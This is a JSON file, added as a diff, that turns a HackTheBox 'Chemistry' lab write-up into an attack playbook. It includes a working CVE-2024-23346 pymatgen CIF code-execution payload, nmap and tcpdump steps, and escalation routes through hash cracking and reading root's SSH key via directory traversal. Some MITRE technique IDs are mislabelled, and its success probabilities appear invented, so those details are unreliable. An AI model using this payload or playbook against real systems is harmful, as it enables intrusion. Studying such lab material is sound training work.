@@ -1,0 +1,817 @@
+{
+  "writeup_id": "Htb_Chemistry",
+  "scenario_fingerprint": {
+    "scenario_name": "linux_web_deserialization_privesc",
+    "primary_services": [
+      "http",
+      "ssh"
+    ],
+    "port_signature": "22+5000",
+    "service_combination": "ssh+flask_web",
+    "os_family": "linux",
+    "environment_type": "web_application",
+    "entry_vector": "python_deserialization",
+    "privilege_path": "web_user_to_root",
+    "attack_complexity": "easy",
+    "estimated_time": "30-45 minutes",
+    "scenario_confidence": 0.92,
+    "distinguishing_factors": [
+      "cif_file_processing",
+      "python_deserialization_vulnerability",
+      "flask_werkzeug_stack",
+      "database_hash_cracking",
+      "aiohttp_directory_traversal"
+    ],
+    "environmental_clues": [
+      "werkzeug_python_server",
+      "ubuntu_20_04_focal",
+      "crystallographic_file_analyzer",
+      "user_registration_system",
+      "internal_aiohttp_service"
+    ],
+    "similar_scenarios": [
+      "pickle_deserialization_boxes",
+      "flask_upload_vulnerabilities"
+    ],
+    "unique_aspects": [
+      "crystallographic_information_files",
+      "chemistry_themed_application",
+      "aiohttp_internal_service",
+      "ssh_key_extraction_via_lfi"
+    ]
+  },
+  "success_patterns": {
+    "success_factors": [
+      {
+        "technique": "CIF_File_Deserialization",
+        "success_reason": "Python library processing CIF files vulnerable to deserialization attacks",
+        "prerequisite_indicators": [
+          "file_upload_functionality",
+          "python_backend_processing",
+          "cif_file_format_accepted",
+          "deserialization_library_in_use"
+        ],
+        "recognition_patterns": [
+          "crystallographic information file processing",
+          "python pickle/marshal usage",
+          "file upload with server-side processing",
+          "werkzeug/flask application stack"
+        ],
+        "failure_modes": [
+          "input_validation_implemented",
+          "safe_parsing_libraries_used",
+          "file_type_restrictions_enforced",
+          "sandboxed_processing_environment"
+        ],
+        "environmental_factors": [
+          "vulnerable_python_libraries",
+          "insufficient_input_sanitization",
+          "direct_file_processing_without_validation"
+        ],
+        "success_probability": 0.75,
+        "typical_timeframe": "15-30 minutes"
+      },
+      {
+        "technique": "Database_Hash_Cracking",
+        "success_reason": "Weak password hashing or crackable hash found in application database",
+        "prerequisite_indicators": [
+          "database_access_obtained",
+          "user_credentials_stored",
+          "weak_hashing_algorithm_used",
+          "common_password_patterns"
+        ],
+        "recognition_patterns": [
+          "sqlite/mysql database files accessible",
+          "md5/sha1 hashes without salt",
+          "user table with password hashes",
+          "predictable password patterns"
+        ],
+        "failure_modes": [
+          "strong_password_policies",
+          "proper_salted_hashing",
+          "database_access_restricted",
+          "encrypted_password_storage"
+        ],
+        "environmental_factors": [
+          "default_application_configuration",
+          "development_environment_practices",
+          "insufficient_password_complexity_requirements"
+        ],
+        "success_probability": 0.82,
+        "typical_timeframe": "10-45 minutes"
+      },
+      {
+        "technique": "Directory_Traversal_AIOHTTP",
+        "success_reason": "Internal AIOHTTP service vulnerable to path traversal attacks",
+        "prerequisite_indicators": [
+          "internal_web_service_discovered",
+          "aiohttp_framework_in_use",
+          "file_serving_functionality",
+          "insufficient_path_validation"
+        ],
+        "recognition_patterns": [
+          "aiohttp server headers",
+          "internal port services",
+          "file download/serving endpoints",
+          "path parameter handling"
+        ],
+        "failure_modes": [
+          "proper_path_sanitization",
+          "chroot_jail_implementation",
+          "access_control_restrictions",
+          "input_validation_filters"
+        ],
+        "environmental_factors": [
+          "internal_service_exposure",
+          "development_framework_defaults",
+          "insufficient_security_hardening"
+        ],
+        "success_probability": 0.68,
+        "typical_timeframe": "20-40 minutes"
+      }
+    ],
+    "critical_discoveries": [
+      {
+        "discovery": "CIF file upload deserialization vulnerability",
+        "discovery_method": "File upload testing with malicious CIF files",
+        "why_critical": "Direct code execution on web server",
+        "how_to_recognize": [
+          "python-based file processing",
+          "crystallographic file format handling",
+          "server-side parsing of uploaded files",
+          "werkzeug/flask error messages"
+        ],
+        "follow_up_actions": [
+          "craft_malicious_cif_payload",
+          "establish_reverse_shell",
+          "enumerate_local_system",
+          "search_for_database_files"
+        ]
+      },
+      {
+        "discovery": "Internal AIOHTTP service on localhost",
+        "discovery_method": "Local port enumeration after initial compromise",
+        "why_critical": "Additional attack surface with different vulnerabilities",
+        "how_to_recognize": [
+          "netstat shows internal services",
+          "aiohttp framework signatures",
+          "localhost-only binding",
+          "different technology stack"
+        ],
+        "follow_up_actions": [
+          "port_forward_or_tunnel_setup",
+          "enumerate_internal_endpoints",
+          "test_directory_traversal_payloads",
+          "target_sensitive_system_files"
+        ]
+      }
+    ],
+    "escalation_keys": [
+      {
+        "privilege_level": "web_application_user",
+        "escalation_method": "Database_credential_reuse",
+        "why_possible": "Cracked hash from database matches system user password",
+        "recognition_signs": [
+          "database_contains_user_hashes",
+          "weak_password_policies",
+          "credential_reuse_patterns",
+          "system_users_match_app_users"
+        ],
+        "exploitation_path": "Database access → Hash cracking → SSH/System login"
+      },
+      {
+        "privilege_level": "regular_user",
+        "escalation_method": "SSH_private_key_theft",
+        "why_possible": "Directory traversal allows reading root's SSH private key",
+        "recognition_signs": [
+          "directory_traversal_vulnerability",
+          "ssh_key_files_accessible",
+          "insufficient_file_permissions",
+          "internal_service_file_access"
+        ],
+        "exploitation_path": "Directory traversal → /root/.ssh/id_rsa → Root SSH access"
+      }
+    ]
+  },
+  "decision_tree": {
+    "decision_points": [
+      {
+        "step": 1,
+        "situation": "Found ports 22 (SSH) and 5000 (HTTP) open on Linux host",
+        "decision": "Focus on web application enumeration first",
+        "reasoning": "Limited attack surface with only SSH and HTTP, web app likely has more vulnerabilities",
+        "confidence": 0.9,
+        "alternatives": [
+          {
+            "option": "ssh_enumeration",
+            "when": "if web app fails"
+          },
+          {
+            "option": "version_specific_exploits",
+            "when": "if specific service versions vulnerable"
+          }
+        ],
+        "success_indicators": [
+          "web_application_accessible",
+          "authentication_mechanism_identified",
+          "file_upload_functionality_found"
+        ],
+        "next_decision": "analyze_web_application_functionality"
+      },
+      {
+        "step": 2,
+        "situation": "Found Flask web application with CIF file upload functionality",
+        "decision": "Research CIF file processing vulnerabilities",
+        "reasoning": "File upload with specific format suggests specialized libraries that may have known vulnerabilities",
+        "confidence": 0.85,
+        "prerequisites": [
+          "file_upload_accessible",
+          "cif_format_identified"
+        ],
+        "success_indicators": [
+          "pymatgen_library_identified",
+          "deserialization_vulnerability_found"
+        ],
+        "failure_fallbacks": [
+          "directory_traversal",
+          "file_type_bypass",
+          "web_parameter_fuzzing"
+        ]
+      },
+      {
+        "step": 3,
+        "situation": "Identified pymatgen library processing CIF files",
+        "decision": "Exploit CVE-2024-23346 deserialization vulnerability",
+        "reasoning": "Known RCE vulnerability in pymatgen CIF processing via pickle deserialization",
+        "confidence": 0.95,
+        "prerequisites": [
+          "cif_upload_functional",
+          "pymatgen_vulnerable_version"
+        ],
+        "success_indicators": [
+          "reverse_shell_obtained",
+          "code_execution_confirmed"
+        ],
+        "failure_fallbacks": [
+          "alternative_cif_exploits",
+          "web_app_parameter_injection"
+        ]
+      }
+    ],
+    "branching_logic": {
+      "if_cve_exploit_succeeds": {
+        "action": "establish_persistent_shell",
+        "tools": [
+          "reverse_shell",
+          "netcat"
+        ],
+        "next_phase": "privilege_escalation_enumeration"
+      },
+      "if_cve_exploit_fails": {
+        "action": "try_alternative_web_attacks",
+        "alternatives": [
+          "directory_traversal",
+          "sql_injection",
+          "file_inclusion"
+        ],
+        "decision_criteria": "based_on_web_app_features"
+      },
+      "if_initial_access_obtained": {
+        "action": "enumerate_system_and_users",
+        "purpose": "find_privilege_escalation_paths",
+        "tools": [
+          "linpeas",
+          "manual_enumeration",
+          "database_access"
+        ]
+      }
+    },
+    "optimization_rules": [
+      {
+        "rule": "research_file_processing_libraries_first",
+        "reasoning": "specialized_file_formats_often_use_vulnerable_libraries",
+        "applicability": "applications_with_file_upload_functionality"
+      },
+      {
+        "rule": "check_for_recent_cves_in_identified_libraries",
+        "reasoning": "newer_vulnerabilities_more_likely_to_be_unpatched",
+        "applicability": "when_specific_libraries_identified"
+      },
+      {
+        "rule": "prioritize_deserialization_vulnerabilities",
+        "reasoning": "often_lead_to_direct_rce_without_additional_steps",
+        "applicability": "python_applications_processing_user_files"
+      }
+    ]
+  },
+  "applicability_rules": {
+    "technique_rules": [
+      {
+        "technique": "Python Deserialization",
+        "mitre_id": "T1055.001",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5000,
+          8000,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "python_web_application",
+          "file_upload_functionality",
+          "pickle_or_yaml_processing",
+          "user_controlled_input"
+        ],
+        "success_indicators": [
+          "werkzeug_server_detected",
+          "flask_application_identified",
+          "file_processing_endpoint_exists",
+          "python_error_messages_visible"
+        ],
+        "incompatible_with": [
+          "input_sanitization_enabled",
+          "file_type_restrictions_enforced",
+          "sandboxed_execution_environment"
+        ],
+        "confidence_boosters": [
+          "cif_file_processing",
+          "scientific_data_handling",
+          "custom_file_format_parsing",
+          "werkzeug_debug_mode"
+        ],
+        "typical_success_rate": 0.75,
+        "estimated_time": "10-30 minutes"
+      },
+      {
+        "technique": "Web Application Enumeration",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          5000,
+          8080,
+          8443
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_service_accessible",
+          "registration_functionality",
+          "file_upload_capability"
+        ],
+        "success_indicators": [
+          "login_registration_pages_found",
+          "user_enumeration_possible",
+          "file_upload_forms_present",
+          "dashboard_functionality_accessible"
+        ],
+        "incompatible_with": [
+          "strong_access_controls",
+          "rate_limiting_enabled",
+          "comprehensive_input_validation"
+        ],
+        "confidence_boosters": [
+          "error_message_disclosure",
+          "predictable_url_structure",
+          "weak_authentication_mechanisms"
+        ],
+        "typical_success_rate": 0.9,
+        "estimated_time": "5-15 minutes"
+      },
+      {
+        "technique": "Directory Traversal",
+        "mitre_id": "T1083",
+        "required_services": [
+          "http",
+          "https"
+        ],
+        "required_ports": [
+          80,
+          443,
+          8080
+        ],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "web_application_present",
+          "file_access_functionality",
+          "insufficient_path_validation"
+        ],
+        "success_indicators": [
+          "aiohttp_server_detected",
+          "internal_web_service_found",
+          "file_read_endpoints_exist",
+          "path_parameters_accepted"
+        ],
+        "incompatible_with": [
+          "proper_path_sanitization",
+          "chroot_jail_environment",
+          "strict_file_permissions"
+        ],
+        "confidence_boosters": [
+          "internal_service_discovery",
+          "aiohttp_framework_usage",
+          "development_environment_indicators"
+        ],
+        "typical_success_rate": 0.65,
+        "estimated_time": "15-45 minutes"
+      },
+      {
+        "technique": "Hash Cracking",
+        "mitre_id": "T1110.002",
+        "required_services": [
+          "any"
+        ],
+        "required_ports": [],
+        "os_requirements": [
+          "linux",
+          "windows"
+        ],
+        "environmental_prerequisites": [
+          "hash_values_obtained",
+          "database_access_achieved",
+          "weak_password_policies"
+        ],
+        "success_indicators": [
+          "database_credentials_found",
+          "user_password_hashes_extracted",
+          "common_hash_formats_identified"
+        ],
+        "incompatible_with": [
+          "strong_password_policies",
+          "salted_hash_implementations",
+          "key_stretching_algorithms"
+        ],
+        "confidence_boosters": [
+          "common_hash_formats",
+          "unsalted_hashes",
+          "default_credentials_present"
+        ],
+        "typical_success_rate": 0.7,
+        "estimated_time": "5-60 minutes"
+      }
+    ],
+    "environmental_detectors": {
+      "python_web_application": {
+        "port_indicators": [
+          5000,
+          8000,
+          8080,
+          80,
+          443
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "banner_indicators": [
+          "Werkzeug",
+          "Python",
+          "Flask",
+          "Django"
+        ],
+        "confidence_threshold": 0.85
+      },
+      "file_upload_service": {
+        "port_indicators": [
+          80,
+          443,
+          5000,
+          8080
+        ],
+        "service_indicators": [
+          "http",
+          "https"
+        ],
+        "technology_indicators": [
+          "multipart/form-data",
+          "file upload",
+          "CIF"
+        ],
+        "confidence_threshold": 0.8
+      },
+      "internal_web_service": {
+        "port_indicators": [
+          8080,
+          8000,
+          3000,
+          9000
+        ],
+        "service_indicators": [
+          "aiohttp",
+          "internal",
+          "development"
+        ],
+        "banner_indicators": [
+          "aiohttp",
+          "internal service"
+        ],
+        "confidence_threshold": 0.75
+      }
+    },
+    "attack_prioritization": {
+      "high_priority": [
+        {
+          "attack": "web_application_enumeration",
+          "when": "python_web_service_detected",
+          "reason": "high_success_rate_reveals_attack_surface"
+        },
+        {
+          "attack": "python_deserialization",
+          "when": "file_upload_functionality_present",
+          "reason": "direct_code_execution_potential"
+        }
+      ],
+      "medium_priority": [
+        {
+          "attack": "directory_traversal",
+          "when": "internal_web_service_discovered",
+          "reason": "privilege_escalation_opportunity"
+        },
+        {
+          "attack": "hash_cracking",
+          "when": "database_access_obtained",
+          "reason": "lateral_movement_enabler"
+        }
+      ]
+    }
+  },
+  "technique_intelligence": {
+    "techniques": [
+      {
+        "name": "Python Deserialization via CIF File Upload",
+        "mitre_id": "T1203",
+        "category": "execution",
+        "phase": "initial_access",
+        "tools_used": [
+          {
+            "name": "CVE-2024-23346 Exploit",
+            "command_template": "Create malicious CIF file with payload in _space_group_magn.transform_BNS_Pp_abc field",
+            "actual_command": "data_5yOhtAoR\n_audit_creation_date 2018-06-08\n_audit_creation_method \"Pymatgen CIF Parser Arbitrary Code Execution Exploit\"\n\nloop_\n_parent_propagation_vector.id\n_parent_propagation_vector.kxkykz\nk1 [0 0 0]\n\n_space_group_magn.transform_BNS_Pp_abc 'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\"__sub\" + \"classes__\"]) () if d.__name__ == \"BuiltinImporter\"][0].load_module (\"os\").system (\"ping -c 1 10.10.14.6\");0,0,0'\n\n_space_group_magn.number_BNS 62.448\n_space_group_magn.name_BNS \"P n' m a' \"",
+            "output_pattern": "500 Internal Server Error on view, command execution occurs",
+            "effectiveness_rating": 5,
+            "reliability": 0.95
+          },
+          {
+            "name": "tcpdump",
+            "command_template": "sudo tcpdump -ni {interface} icmp",
+            "actual_command": "sudo tcpdump -ni tun0 icmp",
+            "success_factors": [
+              "network_connectivity",
+              "icmp_allowed"
+            ],
+            "effectiveness_rating": 5
+          }
+        ],
+        "prerequisites": [
+          "file_upload_functionality",
+          "pymatgen_library_vulnerable_version",
+          "cif_file_processing_enabled"
+        ],
+        "success_indicators": [
+          "file_upload_successful",
+          "500_error_on_view_action",
+          "command_execution_confirmed",
+          "network_callback_received"
+        ],
+        "common_failures": [
+          "pymatgen_version_patched",
+          "file_upload_restrictions",
+          "network_egress_blocked",
+          "payload_syntax_errors"
+        ],
+        "follow_up_techniques": [
+          "reverse_shell_establishment",
+          "privilege_escalation",
+          "lateral_movement"
+        ],
+        "time_investment": "10-20 minutes",
+        "skill_level": "intermediate"
+      },
+      {
+        "name": "User Enumeration via Registration",
+        "mitre_id": "T1087.001",
+        "category": "discovery",
+        "phase": "reconnaissance",
+        "tools_used": [
+          {
+            "name": "Web Browser",
+            "command_template": "Attempt registration with common usernames",
+            "actual_command": "Register with username 'admin' to get 'Username already exists' message",
+            "output_pattern": "Username already exists",
+            "effectiveness_rating": 3,
+            "reliability": 0.9
+          }
+        ],
+        "prerequisites": [
+          "user_registration_enabled",
+          "verbose_error_messages"
+        ],
+        "success_indicators": [
+          "different_error_messages_for_existing_users",
+          "username_enumeration_possible"
+        ],
+        "common_failures": [
+          "generic_error_messages",
+          "rate_limiting_implemented",
+          "account_lockout_mechanisms"
+        ],
+        "follow_up_techniques": [
+          "password_spraying",
+          "credential_stuffing",
+          "social_engineering"
+        ],
+        "time_investment": "5-15 minutes",
+        "skill_level": "beginner"
+      }
+    ],
+    "tool_effectiveness": [
+      {
+        "tool": "feroxbuster",
+        "use_case": "web_directory_enumeration",
+        "effectiveness_rating": 4,
+        "reliability": 0.95,
+        "learning_curve": "low",
+        "essential_for": [
+          "web_application_testing"
+        ],
+        "alternatives": [
+          "gobuster",
+          "dirbuster",
+          "ffuf"
+        ],
+        "best_practices": [
+          "use_appropriate_wordlists",
+          "filter_404_responses",
+          "check_for_redirects"
+        ]
+      },
+      {
+        "tool": "nmap",
+        "use_case": "port_scanning_and_service_detection",
+        "effectiveness_rating": 5,
+        "reliability": 0.98,
+        "learning_curve": "low",
+        "essential_for": [
+          "network_reconnaissance"
+        ],
+        "alternatives": [
+          "masscan",
+          "rustscan"
+        ],
+        "best_practices": [
+          "start_with_fast_port_scan",
+          "follow_up_with_service_detection",
+          "use_appropriate_timing_options"
+        ]
+      }
+    ],
+    "command_sequences": [
+      {
+        "sequence_name": "cif_deserialization_exploit",
+        "steps": [
+          {
+            "step": 1,
+            "command": "nmap -p- --min-rate 10000 10.10.11.38",
+            "purpose": "Discover open ports",
+            "expected_output": "Ports 22 and 5000 open"
+          },
+          {
+            "step": 2,
+            "command": "Register account on web application",
+            "purpose": "Gain access to file upload functionality",
+            "expected_output": "Successful registration and dashboard access"
+          },
+          {
+            "step": 3,
+            "command": "sudo tcpdump -ni tun0 icmp",
+            "purpose": "Monitor for command execution confirmation",
+            "expected_output": "Listening for ICMP packets"
+          },
+          {
+            "step": 4,
+            "command": "Upload malicious CIF file with CVE-2024-23346 payload",
+            "purpose": "Exploit pymatgen deserialization vulnerability",
+            "expected_output": "File uploaded successfully"
+          },
+          {
+            "step": 5,
+            "command": "Click 'View' on uploaded structure",
+            "purpose": "Trigger payload execution",
+            "expected_output": "500 error and ICMP packet received"
+          }
+        ],
+        "success_rate": 0.92,
+        "typical_duration": "15-30 minutes"
+      }
+    ]
+  },
+  "metadata": {
+    "basic_metadata": {
+      "name": "Chemistry",
+      "difficulty": "Easy",
+      "os": "Linux Ubuntu",
+      "platform": "HackTheBox",
+      "release_date": "2024-10-19",
+      "author": "FisMatHack",
+      "estimated_time": "30-45 minutes"
+    },
+    "intelligence_metadata": {
+      "attack_complexity": "low",
+      "skill_level_required": "beginner",
+      "primary_attack_vectors": [
+        "deserialization",
+        "directory_traversal",
+        "hash_cracking"
+      ],
+      "key_vulnerabilities": [
+        "python_deserialization",
+        "path_traversal",
+        "weak_credentials"
+      ],
+      "environment_type": "web_application_server",
+      "real_world_relevance": "high",
+      "learning_value": [
+        "python_deserialization_attacks",
+        "file_upload_exploitation",
+        "aiohttp_vulnerabilities"
+      ],
+      "prerequisite_knowledge": [
+        "basic_web_exploitation",
+        "python_serialization",
+        "hash_cracking"
+      ]
+    },
+    "categorization": {
+      "primary_category": "web_exploitation",
+      "subcategories": [
+        "deserialization",
+        "file_traversal",
+        "credential_attacks"
+      ],
+      "attack_types": [
+        "initial_access",
+        "credential_access",
+        "privilege_escalation"
+      ],
+      "defensive_lessons": [
+        "input_validation",
+        "secure_deserialization",
+        "proper_file_permissions"
+      ]
+    },
+    "similarity_markers": {
+      "similar_boxes": [
+        "Pickle",
+        "Serialized",
+        "Obscurity"
+      ],
+      "similarity_reasons": [
+        "deserialization_attacks",
+        "file_upload_vulnerabilities",
+        "python_exploitation"
+      ],
+      "unique_aspects": [
+        "cif_file_processing",
+        "aiohttp_framework",
+        "crystallographic_data"
+      ],
+      "difficulty_factors": [
+        "straightforward_exploit_chain",
+        "well_known_vulnerabilities",
+        "clear_attack_path"
+      ]
+    }
+  },
+  "extraction_metadata": {
+    "parse_date": "2025-07-04T19:27:51.708707",
+    "original_file": "0xdf_writeups/Htb Chemistry.md",
+    "content_length": 30342,
+    "extraction_version": "2.0-claude",
+    "model_used": "claude-sonnet-4-20250514"
+  },
+  "intelligence_confidence": 1.0,
+  "quality_breakdown": {
+    "scenario_uniqueness": 1.0,
+    "success_logic_clarity": 1.0,
+    "applicability_completeness": 1.0,
+    "decision_tree_depth": 1.0,
+    "technique_actionability": 1.0
+  }
+}
